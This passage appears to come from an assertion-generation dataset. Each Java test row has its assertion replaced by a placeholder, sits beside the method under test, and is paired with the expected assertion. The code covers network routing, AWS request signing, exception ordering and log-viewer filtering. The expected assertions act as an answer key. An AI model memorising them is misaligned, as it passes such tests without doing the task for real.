receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertFalse(captor.getValue().passedValiant())
"testFields() { // TCP header 480bit // Ip header 480bit // Packet size = 64bit // Buffer size for 30 packets = (480+480+64)*30 = 30720 long maxNumberOfBits = 30720; long packetSizeByte = 8; BoundedPriorityOutputPort port = new BoundedPriorityOutputPort( sourceNetworkDevice, targetNetworkDevice, link, maxNumberOfBits );  Random r = new Random(); for(int i = 0; i < 60; i++){ FullExtTcpPacket p = new FullExtTcpPacket( 0L,packetSizeByte,0,0,1,0,0,0L,0L,false, false,false,false,false,false,false, false,false,0,r.nextInt(100) ); port.enqueue(p); } ""<AssertPlaceHolder>""; }
enqueue(Packet packet) { guaranteedEnqueue(packet); while (getBufferOccupiedBits() > maxQueueSizeInBits){ decreaseBufferOccupiedBits(priorityQueue.pollLast().getSizeBit()); }  }"	assertEquals(port.getQueueSize(), 30)
"returnSignedRequest() { ArgumentCaptor<SignableRequest> signableRequestArgumentCaptor = ArgumentCaptor.forClass(SignableRequest.class); underTest.setAws4Signer(mockAWS4Signer);  Request actualSignedRequest = underTest.sign(new Request.Builder() .url(""http://api.amazon.com"") .build());  verify(mockAWS4Signer) .sign(signableRequestArgumentCaptor.capture(), any(AWSCredentials.class));  SignableRequest actualSignableRequest = signableRequestArgumentCaptor.getValue();  ""<AssertPlaceHolder>""; }
sign(Request originalRequest) { SignableRequest<Request> signableRequest = new SignableRequestImpl(originalRequest); if (awsCredentialsProvider != null) { aws4Signer.sign(signableRequest, awsCredentialsProvider.getCredentials()); } else { aws4Signer.sign(signableRequest, awsCredentials); } return (Request) signableRequest.getOriginalRequestObject(); }"	assertEquals(((Request)actualSignableRequest.getOriginalRequestObject()).url(), actualSignedRequest.url())
"returnSignedRequestWithCredentialProvider() { ArgumentCaptor<SignableRequest> signableRequestArgumentCaptor = ArgumentCaptor.forClass(SignableRequest.class);  Mockito.when(mockAWSCredentialsProvider.getCredentials()).thenReturn(mockAWSCredentials);  underTestCredentialsProvider = new AWSSigV4Signer(AWSAuthenticationCredentials.builder() .accessKeyId(TEST_ACCESS_KEY_ID) .secretKey(TEST_SECRET_KEY) .region(TEST_REGION) .build(), AWSAuthenticationCredentialsProvider.builder() .roleArn(TEST_ROLE_ARN) .roleSessionName(TEST_ROLESESSION_NAME) .build() ); underTestCredentialsProvider.setAws4Signer(mockAWS4Signer); underTestCredentialsProvider.setAwsCredentialsProvider(mockAWSCredentialsProvider);  Request actualSignedRequest = underTestCredentialsProvider.sign(new Request.Builder() .url(""http://api.amazon.com"") .build());  verify(mockAWS4Signer) .sign(signableRequestArgumentCaptor.capture(), any(AWSCredentials.class));  SignableRequest actualSignableRequest = signableRequestArgumentCaptor.getValue();  ""<AssertPlaceHolder>""; }
sign(Request originalRequest) { SignableRequest<Request> signableRequest = new SignableRequestImpl(originalRequest); if (awsCredentialsProvider != null) { aws4Signer.sign(signableRequest, awsCredentialsProvider.getCredentials()); } else { aws4Signer.sign(signableRequest, awsCredentials); } return (Request) signableRequest.getOriginalRequestObject(); }"	assertEquals(((Request)actualSignableRequest.getOriginalRequestObject()).url(), actualSignedRequest.url())
"IOException { LWAClient testLWAClient = new LWAClient(TEST_ENDPOINT); testLWAClient.setOkHttpClient(mockOkHttpClient);  when(mockOkHttpClient.newCall(any(Request.class))) .thenReturn(mockCall); when(mockCall.execute()) .thenReturn(buildResponse(200, ""Azta|foo"", ""120"")) .thenReturn(buildResponse(200, ""Azta|foo1"", ""1""));  LWAAccessTokenCache testLWACache = new LWAAccessTokenCacheImpl(); LWAAuthorizationSigner testlwaSigner = new LWAAuthorizationSigner(LWAAuthorizationCredentials.builder() .clientId(TEST_CLIENT_ID) .clientSecret(TEST_CLIENT_SECRET) .refreshToken(TEST_REFRESH_TOKEN) .endpoint(TEST_ENDPOINT) .build() , testLWACache );  testlwaSigner.setLwaClient(testLWAClient); testLWAClient.setLWAAccessTokenCache(testLWACache); Request actualSignedRequest = testlwaSigner.sign(request); Request actualSignedSecondRequest = testlwaSigner.sign(request);  ""<AssertPlaceHolder>""; }
sign(Request originalRequest) { String accessToken = lwaClient.getAccessToken(lwaAccessTokenRequestMeta);  return originalRequest.newBuilder() .addHeader(SIGNED_ACCESS_TOKEN_HEADER_NAME, accessToken) .build(); }"	"assertEquals(""Azta|foo"", actualSignedSecondRequest.header(""x-amz-access-token""))"
"getReadLimitInfo() { ""<AssertPlaceHolder>""; }
getReadLimitInfo() { return null; }"	assertNull(underTest.getReadLimitInfo())
"getResourcePath() { ""<AssertPlaceHolder>""; }
getResourcePath() { return originalRequest.url() .getPath(); }"	"assertEquals(""/request/library"", underTest.getResourcePath())"
"noTimeOffset() { ""<AssertPlaceHolder>""; }
getTimeOffset() { return 0; }"	assertEquals(0, underTest.getTimeOffset())
"getEndpoint() { ""<AssertPlaceHolder>""; }
getEndpoint() { URI uri = null; try { uri = originalRequest.url().toURI(); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return URI.create(String.format(""%s://%s"", uri.getScheme(), uri.getHost())); }"	"assertEquals(URI.create(""http://www.amazon.com""), underTest.getEndpoint())"
"getParameters() { Map<String, List<String>> expectedParamters = new HashMap<>(); expectedParamters.put(""test"", Collections.singletonList(""true"")); expectedParamters.put(""sky"", Collections.singletonList(""blue"")); expectedParamters.put(""right"", Collections.singletonList(""右""));  ""<AssertPlaceHolder>""; }
getParameters() { Map<String, List<String>> parameters = new HashMap<>(); try { List<NameValuePair> nameValuePairs = URLEncodedUtils.parse(originalRequest.url().toURI(), StandardCharsets.UTF_8); nameValuePairs.forEach(nameValuePair -> parameters.put(nameValuePair.getName(), Collections.singletonList(nameValuePair.getValue()))); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return parameters; }"	assertEquals(expectedParamters, underTest.getParameters())
"getContent() { String expectedContent = ""{""foo"":""bar""}""; StringBuilder actualContent = new StringBuilder();  underTest = new SignableRequestImpl(new Request.Builder() .url(""https://www.amazon.com"") .post(RequestBody.create(MediaType.parse(""application/json; charset=utf-8""), expectedContent)) .build());  try(Scanner scanner = new Scanner(underTest.getContent())){ while(scanner.hasNext()) { actualContent.append(scanner.next()); } }  ""<AssertPlaceHolder>""; }
getContent() { ByteArrayInputStream inputStream = null;  if (originalRequest.body() != null) { try { Buffer buffer = new Buffer(); originalRequest.body().writeTo(buffer); inputStream = new ByteArrayInputStream(buffer.readByteArray()); } catch (IOException e) { throw new RuntimeException(""Unable to buffer request body"", e); } }  return inputStream; }"	assertEquals(expectedContent, actualContent.toString())
"getUnwrappedContent() { String expectedContent = ""{""ban"":""bop""}""; StringBuilder actualContent = new StringBuilder();  underTest = new SignableRequestImpl(new Request.Builder() .url(""https://www.amazon.com"") .post(RequestBody.create(MediaType.parse(""application/json; charset=utf-8""), expectedContent)) .build());  try(Scanner scanner = new Scanner(underTest.getContentUnwrapped())){ while(scanner.hasNext()) { actualContent.append(scanner.next()); } }  ""<AssertPlaceHolder>""; }
getContentUnwrapped() { return getContent(); }"	assertEquals(expectedContent, actualContent.toString())
"gracefulBlankParametersParse() { testRequest = new Request.Builder() .url(""http://www.amazon.com/request/library?  "") .get() .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getParameters() { Map<String, List<String>> parameters = new HashMap<>(); try { List<NameValuePair> nameValuePairs = URLEncodedUtils.parse(originalRequest.url().toURI(), StandardCharsets.UTF_8); nameValuePairs.forEach(nameValuePair -> parameters.put(nameValuePair.getName(), Collections.singletonList(nameValuePair.getValue()))); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return parameters; }"	assertTrue(underTest.getParameters().isEmpty())
"gracefulIncompleteParameterPairsParse() { testRequest = new Request.Builder() .url(""http://www.amazon.com/request/library?isSigned& =false"") .get() .build();  Map<String, List<String>> expected = new HashMap<>(); expected.put(""isSigned"", Collections.singletonList(null)); expected.put("" "", Collections.singletonList(""false""));  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getParameters() { Map<String, List<String>> parameters = new HashMap<>(); try { List<NameValuePair> nameValuePairs = URLEncodedUtils.parse(originalRequest.url().toURI(), StandardCharsets.UTF_8); nameValuePairs.forEach(nameValuePair -> parameters.put(nameValuePair.getName(), Collections.singletonList(nameValuePair.getValue()))); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return parameters; }"	assertEquals(expected, underTest.getParameters())
"getHeadersIncludesContentTypeFromRequestBody() { String expected = ""application/json; charset=utf-8""; RequestBody requestBody = RequestBody.create(MediaType.parse(expected), ""{""foo"":""bar""}"");  testRequest = new Request.Builder() .url(""http://www.amazon.com"") .post(requestBody) .header(""Content-Type"", ""THIS SHOULD BE OVERRIDDEN WITH REQUEST BODY CONTENT TYPE"") .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getHeaders() { Map<String, String> headers = new HashMap<>();  Request requestSnapshot = signableRequestBuilder.build(); requestSnapshot.headers() .names() .forEach(headerName -> headers.put(headerName, requestSnapshot.header(headerName)));  if (requestSnapshot.body() != null) { MediaType contentType = requestSnapshot.body().contentType(); if (contentType != null) { headers.put(CONTENT_TYPE_HEADER_NAME, contentType.toString()); } }  return headers; }"	"assertEquals(expected, underTest.getHeaders().get(""Content-Type""))"
"missingRequestBodyDoesNotOverwriteExistingContentTypeHeader() { String expected = ""testContentType"";  testRequest = new Request.Builder() .url(""http://www.amazon.com"") .get() .header(""Content-Type"", expected) .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getHeaders() { Map<String, String> headers = new HashMap<>();  Request requestSnapshot = signableRequestBuilder.build(); requestSnapshot.headers() .names() .forEach(headerName -> headers.put(headerName, requestSnapshot.header(headerName)));  if (requestSnapshot.body() != null) { MediaType contentType = requestSnapshot.body().contentType(); if (contentType != null) { headers.put(CONTENT_TYPE_HEADER_NAME, contentType.toString()); } }  return headers; }"	"assertEquals(expected, underTest.getHeaders().get(""Content-Type""))"
"missingRequestBodyContentTypeDoesNotOverwriteExistingContentTypeHeader() { String expected = ""testContentType"";  testRequest = new Request.Builder() .url(""http://www.amazon.com"") .post(RequestBody.create(null, ""foo"")) .header(""Content-Type"", expected) .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getHeaders() { Map<String, String> headers = new HashMap<>();  Request requestSnapshot = signableRequestBuilder.build(); requestSnapshot.headers() .names() .forEach(headerName -> headers.put(headerName, requestSnapshot.header(headerName)));  if (requestSnapshot.body() != null) { MediaType contentType = requestSnapshot.body().contentType(); if (contentType != null) { headers.put(CONTENT_TYPE_HEADER_NAME, contentType.toString()); } }  return headers; }"	"assertEquals(expected, underTest.getHeaders().get(""Content-Type""))"
"testCaso0() { try { OrdenEjecucion.ordename(0); } catch (Exception e) { Assert.fail(""En el caso 0 no deberían saltar excepciones.""); } Assert.""<AssertPlaceHolder>""; }
ordename(int caso) throws BException { res = ""A""; try { res += ""B""; metodoUno(caso); res += ""C""; } catch (AException ae) { res += ""D""; } catch (BException be) { res += ""E""; throw be; // ni compila, si la pongo res += ""F""; } finally { res += ""G""; metodoDos(caso); res += ""H""; } res += ""I""; }"	"assertEquals(""Caso 0 ko"", CASO_0, OrdenEjecucion.res)"
"testCaso1() { try { OrdenEjecucion.ordename(1); } catch (Exception e) { Assert.fail(""En el caso 1 no deberían saltar excepciones.""); } Assert.""<AssertPlaceHolder>""; }
ordename(int caso) throws BException { res = ""A""; try { res += ""B""; metodoUno(caso); res += ""C""; } catch (AException ae) { res += ""D""; } catch (BException be) { res += ""E""; throw be; // ni compila, si la pongo res += ""F""; } finally { res += ""G""; metodoDos(caso); res += ""H""; } res += ""I""; }"	"assertEquals(""Caso 1 ko"", CASO_1, OrdenEjecucion.res)"
"testCaso2() { try { OrdenEjecucion.ordename(2); } catch (Exception e) { } Assert.""<AssertPlaceHolder>""; }
ordename(int caso) throws BException { res = ""A""; try { res += ""B""; metodoUno(caso); res += ""C""; } catch (AException ae) { res += ""D""; } catch (BException be) { res += ""E""; throw be; // ni compila, si la pongo res += ""F""; } finally { res += ""G""; metodoDos(caso); res += ""H""; } res += ""I""; }"	"assertEquals(""Caso 2 ko"", CASO_2, OrdenEjecucion.res)"
"testCaso3() { try { OrdenEjecucion.ordename(3); } catch (Exception e) { } Assert.""<AssertPlaceHolder>""; }
ordename(int caso) throws BException { res = ""A""; try { res += ""B""; metodoUno(caso); res += ""C""; } catch (AException ae) { res += ""D""; } catch (BException be) { res += ""E""; throw be; // ni compila, si la pongo res += ""F""; } finally { res += ""G""; metodoDos(caso); res += ""H""; } res += ""I""; }"	"assertEquals(""Caso 3 ko"", CASO_3, OrdenEjecucion.res)"
"testCaso4() { try { OrdenEjecucion.ordename(4); } catch (Exception e) { } Assert.""<AssertPlaceHolder>""; }
ordename(int caso) throws BException { res = ""A""; try { res += ""B""; metodoUno(caso); res += ""C""; } catch (AException ae) { res += ""D""; } catch (BException be) { res += ""E""; throw be; // ni compila, si la pongo res += ""F""; } finally { res += ""G""; metodoDos(caso); res += ""H""; } res += ""I""; }"	"assertEquals(""Caso 4 ko"", CASO_4, OrdenEjecucion.res)"
"Exception { Predicate<String> p = new SearcherBuilder().buildPlain(PLAIN_PATTERN); for (Case theCase : PLAIN_CASES) { ""<AssertPlaceHolder>""; } }
buildPlain(String pattern) throws RequestCompilationException { return build(pattern, true); }"	assertThat(p.test(theCase.text), matchesCase(false, true, theCase))
"Exception { // Explicit specification of default Predicate<String> p = new SearcherBuilder().setIgnoreCase(false).setMatchWholeText(true).buildPlain(PLAIN_PATTERN); for (Case theCase : PLAIN_CASES) { ""<AssertPlaceHolder>""; } }
buildPlain(String pattern) throws RequestCompilationException { return build(pattern, true); }"	assertThat(p.test(theCase.text), matchesCase(false, true, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().setIgnoreCase(true).setMatchWholeText(true).buildPlain(PLAIN_PATTERN); for (Case theCase : PLAIN_CASES) { ""<AssertPlaceHolder>""; } }
buildPlain(String pattern) throws RequestCompilationException { return build(pattern, true); }"	assertThat(p.test(theCase.text), matchesCase(true, true, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().setIgnoreCase(false).setMatchWholeText(false).buildPlain(PLAIN_PATTERN); for (Case theCase : PLAIN_CASES) { ""<AssertPlaceHolder>""; } }
buildPlain(String pattern) throws RequestCompilationException { return build(pattern, true); }"	assertThat(p.test(theCase.text), matchesCase(false, false, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().setIgnoreCase(true).setMatchWholeText(false).buildPlain(PLAIN_PATTERN); for (Case theCase : PLAIN_CASES) { ""<AssertPlaceHolder>""; } }
buildPlain(String pattern) throws RequestCompilationException { return build(pattern, true); }"	assertThat(p.test(theCase.text), matchesCase(true, false, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().buildRegexp(REGEXP_PATTERN); for (Case theCase : REGEXP_CASES) { ""<AssertPlaceHolder>""; } }
buildRegexp(String pattern) throws RequestCompilationException { return build(pattern, false); }"	assertThat(p.test(theCase.text), matchesCase(false, true, theCase))
"Exception { // Explicit specification of default Predicate<String> p = new SearcherBuilder().setIgnoreCase(false).setMatchWholeText(true).buildRegexp(REGEXP_PATTERN);  for (Case theCase : REGEXP_CASES) { ""<AssertPlaceHolder>""; } }
buildRegexp(String pattern) throws RequestCompilationException { return build(pattern, false); }"	assertThat(p.test(theCase.text), matchesCase(false, true, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().setIgnoreCase(true).setMatchWholeText(true).buildRegexp(REGEXP_PATTERN);  for (Case theCase : REGEXP_CASES) { ""<AssertPlaceHolder>""; } }
buildRegexp(String pattern) throws RequestCompilationException { return build(pattern, false); }"	assertThat(p.test(theCase.text), matchesCase(true, true, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().setIgnoreCase(false).setMatchWholeText(false).buildRegexp(REGEXP_PATTERN);  for (Case theCase : REGEXP_CASES) { ""<AssertPlaceHolder>""; } }
buildRegexp(String pattern) throws RequestCompilationException { return build(pattern, false); }"	assertThat(p.test(theCase.text), matchesCase(false, false, theCase))
"Exception { Predicate<String> p = new SearcherBuilder().setIgnoreCase(true).setMatchWholeText(false).buildRegexp(REGEXP_PATTERN);  for (Case theCase : REGEXP_CASES) { ""<AssertPlaceHolder>""; } }
buildRegexp(String pattern) throws RequestCompilationException { return build(pattern, false); }"	assertThat(p.test(theCase.text), matchesCase(true, false, theCase))
"Exception { DataSource oldDataSource = mock(DataSource.class); DataSource newDataSource = mock(DataSource.class);  AtomicReference<DataSource> dataSourceInCallback = new AtomicReference<>();  DataSourceHolder holder = new DataSourceHolder(); holder.setDataSource(oldDataSource);  holder.asObservable().addObserver((a1, a2) -> dataSourceInCallback.set(holder.getDataSource())); holder.setDataSource(newDataSource);  ""<AssertPlaceHolder>""; }
setDataSource(DataSource source) { // TODO(mlopatkin) figure out whether source can be null DataSource oldSource = this.source; this.source = source; for (Observer o : observers) { o.onDataSourceChanged(oldSource, source); } }"	assertEquals(newDataSource, dataSourceInCallback.get())
"Exception { ""<AssertPlaceHolder>""; }
asObservable() { return observers.asObservable(); }"	assertNotNull(model.asObservable())
"Exception { CharSource in = CharSource.wrap(""{""TestClient"":{""s"":""123456""}}""); CharSink out = new NullCharSink();  ConfigStorageImpl storage = new ConfigStorageImpl(in, out, MoreExecutors.newDirectExecutorService()); storage.load();  ""<AssertPlaceHolder>""; }
loadConfig(ConfigStorageClient<T> client) { String clientName = client.getName(); JsonElement element; synchronized (serializedConfig) { element = serializedConfig.get(clientName); } try { if (element != null) { return client.fromJson(gson, element); } } catch (JsonSyntaxException | InvalidJsonContentException e) { // We have some weird JSON for this client. Discard it unless somebody updated it in // background. synchronized (serializedConfig) { if (serializedConfig.get(clientName) == element) { serializedConfig.remove(clientName); scheduleCommitLocked(); } } logger.error(""Failed to parse config data of "" + client.getName(), e); } // failed to load/parse, provide fallback return client.getDefault(); }"	"assertEquals(""123456"", storage.loadConfig(new TestClient()).s)"
"Exception { CharSource in = CharSource.empty(); StringCharSink out = new StringCharSink();  ConfigStorage storage = new ConfigStorageImpl(in, out, MoreExecutors.newDirectExecutorService());  storage.saveConfig(new TestClient(), new TestClientData(""123456""));  ""<AssertPlaceHolder>""; }
saveConfig(ConfigStorageClient<T> client, T value) { String name = client.getName(); JsonElement json = client.toJson(gson, value); logger.debug(""Client "" + name + "" changed the config""); synchronized (serializedConfig) { serializedConfig.put(name, json); scheduleCommitLocked(); } }"	"assertEquals("""""" { ""TestClient"": { ""s"": ""123456"" } }"""""", out.getLastWrittenString())"
"filterWithOneBufferAcceptsThisBuffer() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, accepts(LogRecordUtils.forBuffer(Buffer.MAIN)))
"filterWithOneBufferAcceptsNullBuffer() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, accepts(LogRecordUtils.forUnknownBuffer()))
"filterWithOneBufferRejectsOtherBuffers() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, rejects(LogRecordUtils.forBuffer(Buffer.EVENTS)))
"filterWithTwoBuffersAcceptsNullBuffer() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.SYSTEM, true); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, accepts(LogRecordUtils.forUnknownBuffer()))
"filterWithTwoBufferRejectsOtherBuffers() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.SYSTEM, true); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, rejects(LogRecordUtils.forBuffer(Buffer.EVENTS)))
"filterRejectsBufferAfterItWasDisabled() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.SYSTEM, true); filter.setBufferEnabled(Buffer.SYSTEM, false); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, rejects(LogRecordUtils.forBuffer(Buffer.SYSTEM)))
"filterAcceptsBufferThatIsStillEnabled() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.SYSTEM, true); filter.setBufferEnabled(Buffer.SYSTEM, false); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, accepts(LogRecordUtils.forBuffer(Buffer.MAIN)))
"nullBufferIsAcceptedIfAllAreDisabled() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.SYSTEM, true); filter.setBufferEnabled(Buffer.SYSTEM, false); filter.setBufferEnabled(Buffer.MAIN, false); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, accepts(LogRecordUtils.forUnknownBuffer()))
"secondEnablingOfBufferIsNoop() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.MAIN, true); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, accepts(LogRecordUtils.forBuffer(Buffer.MAIN)))
"secondDisablingOfBufferIsNoop() { LogBufferFilter filter = new LogBufferFilter(); filter.setBufferEnabled(Buffer.MAIN, true); filter.setBufferEnabled(Buffer.MAIN, false); filter.setBufferEnabled(Buffer.MAIN, false); ""<AssertPlaceHolder>""; }
setBufferEnabled(Buffer buffer, boolean enabled) { if (enabled) { buffers.add(buffer); } else { buffers.remove(buffer); } }"	assertThat(filter, rejects(LogRecordUtils.forBuffer(Buffer.MAIN)))
"Exception { List<Column> columns = Arrays.asList(Column.values()); LogRecordTableColumnModel model = LogRecordTableColumnModel.createForTest(columns);  ""<AssertPlaceHolder>""; }
createForTest(Collection<Column> availableColumns) { return new LogRecordTableColumnModel( null, availableColumns, ColumnOrder.canonical(), EnumSet.allOf(Column.class)); }"	"assertThat(""All columns should be here"", getColumns(model), areTableColumnsFor(columns))"
"Exception { ImmutableList<Column> columns = ImmutableList.of(Column.PID, Column.MESSAGE, Column.APP_NAME); LogRecordTableColumnModel model = LogRecordTableColumnModel.createForTest(columns);  ""<AssertPlaceHolder>""; }
createForTest(Collection<Column> availableColumns) { return new LogRecordTableColumnModel( null, availableColumns, ColumnOrder.canonical(), EnumSet.allOf(Column.class)); }"	assertThat(getColumns(model), areTableColumnsFor(columns.stream().sorted().collect(Collectors.toList())))
"Exception { EventQueue.invokeAndWait(() -> { SelectedRowsImpl selectedRows = new SelectedRowsImpl(table, model); table.setRowSelectionInterval(0, 0);  ""<AssertPlaceHolder>""; }); }
getSelectedRows() { if (selectionModel.getMinSelectionIndex() < 0) { return ImmutableList.of(); } ImmutableList.Builder<TableRow> builder = ImmutableList.builder(); for (int i = selectionModel.getMinSelectionIndex(); i <= selectionModel.getMaxSelectionIndex(); ++i) { if (selectionModel.isSelectedIndex(i)) { builder.add(tableModel.getRow(getRowModelIndex(i))); } } return builder.build(); }"	assertThat(selectedRows.getSelectedRows(), contains(model.getRow(0)))
"Exception { EventQueue.invokeAndWait(() -> { SelectedRowsImpl selectedRows = new SelectedRowsImpl(table, model); table.setRowSelectionInterval(1, 1);  ""<AssertPlaceHolder>""; }); }
getSelectedRows() { if (selectionModel.getMinSelectionIndex() < 0) { return ImmutableList.of(); } ImmutableList.Builder<TableRow> builder = ImmutableList.builder(); for (int i = selectionModel.getMinSelectionIndex(); i <= selectionModel.getMaxSelectionIndex(); ++i) { if (selectionModel.isSelectedIndex(i)) { builder.add(tableModel.getRow(getRowModelIndex(i))); } } return builder.build(); }"	assertThat(selectedRows.getSelectedRows(), contains(model.getRow(1)))
"Exception { EventQueue.invokeAndWait(() -> { SelectedRowsImpl selectedRows = new SelectedRowsImpl(table, model); table.setRowSelectionInterval(0, 1);  ""<AssertPlaceHolder>""; }); }
getSelectedRows() { if (selectionModel.getMinSelectionIndex() < 0) { return ImmutableList.of(); } ImmutableList.Builder<TableRow> builder = ImmutableList.builder(); for (int i = selectionModel.getMinSelectionIndex(); i <= selectionModel.getMaxSelectionIndex(); ++i) { if (selectionModel.isSelectedIndex(i)) { builder.add(tableModel.getRow(getRowModelIndex(i))); } } return builder.build(); }"	assertThat(selectedRows.getSelectedRows(), contains(model.getRow(0), model.getRow(1)))
"Exception { EventQueue.invokeAndWait(() -> { SelectedRowsImpl selectedRows = new SelectedRowsImpl(table, model); table.clearSelection();  ""<AssertPlaceHolder>""; }); }
getSelectedRows() { if (selectionModel.getMinSelectionIndex() < 0) { return ImmutableList.of(); } ImmutableList.Builder<TableRow> builder = ImmutableList.builder(); for (int i = selectionModel.getMinSelectionIndex(); i <= selectionModel.getMaxSelectionIndex(); ++i) { if (selectionModel.isSelectedIndex(i)) { builder.add(tableModel.getRow(getRowModelIndex(i))); } } return builder.build(); }"	assertThat(selectedRows.getSelectedRows(), is(empty()))
"showContextMenuClearsSelectionIfClickedOutsideOfRows() { SelectedRows selectedRows = new TestSelectedRows(makeRow(1));  SelectionAdjuster adjuster = new SelectionAdjuster(selectedRows);  adjuster.onPopupMenuShown(null);  ""<AssertPlaceHolder>""; }
onPopupMenuShown(@Nullable TableRow row) { if (row != null) { if (!selectedRows.isRowSelected(row)) { selectedRows.setSelectedRow(row); } } else { selectedRows.clearSelection(); } }"	assertThat(selectedRows.getSelectedRows(), is(empty()))
"showContextMenuAddsSelectionIfNothingSelected() { SelectedRows selectedRows = new TestSelectedRows();  SelectionAdjuster adjuster = new SelectionAdjuster(selectedRows);  adjuster.onPopupMenuShown(makeRow(1));  ""<AssertPlaceHolder>""; }
onPopupMenuShown(@Nullable TableRow row) { if (row != null) { if (!selectedRows.isRowSelected(row)) { selectedRows.setSelectedRow(row); } } else { selectedRows.clearSelection(); } }"	assertThat(selectedRows.getSelectedRows(), contains(makeRow(1)))
"showContextMenuReplacesSelectionIfRowNotSelected() { SelectedRows selectedRows = new TestSelectedRows(makeRow(1));  SelectionAdjuster adjuster = new SelectionAdjuster(selectedRows);  adjuster.onPopupMenuShown(makeRow(2));  ""<AssertPlaceHolder>""; }
onPopupMenuShown(@Nullable TableRow row) { if (row != null) { if (!selectedRows.isRowSelected(row)) { selectedRows.setSelectedRow(row); } } else { selectedRows.clearSelection(); } }"	assertThat(selectedRows.getSelectedRows(), contains(makeRow(2)))
"showContextMenuKeepsSelectionIfClickedRowAlreadySelected() { SelectedRows selectedRows = new TestSelectedRows(makeRow(1), makeRow(2));  SelectionAdjuster adjuster = new SelectionAdjuster(selectedRows);  adjuster.onPopupMenuShown(makeRow(1));  ""<AssertPlaceHolder>""; }
onPopupMenuShown(@Nullable TableRow row) { if (row != null) { if (!selectedRows.isRowSelected(row)) { selectedRows.setSelectedRow(row); } } else { selectedRows.clearSelection(); } }"	assertThat(selectedRows.getSelectedRows(), contains(makeRow(1), makeRow(2)))
"menuIsHiddenIfNoBuffersAvailable() { parentMenu.setVisible(true);  BufferFilterMenu menu = new BufferFilterMenu(parentMenu, bufferFilter); menu.setAvailableBuffers(EnumSet.noneOf(LogRecord.Buffer.class));  ""<AssertPlaceHolder>""; }
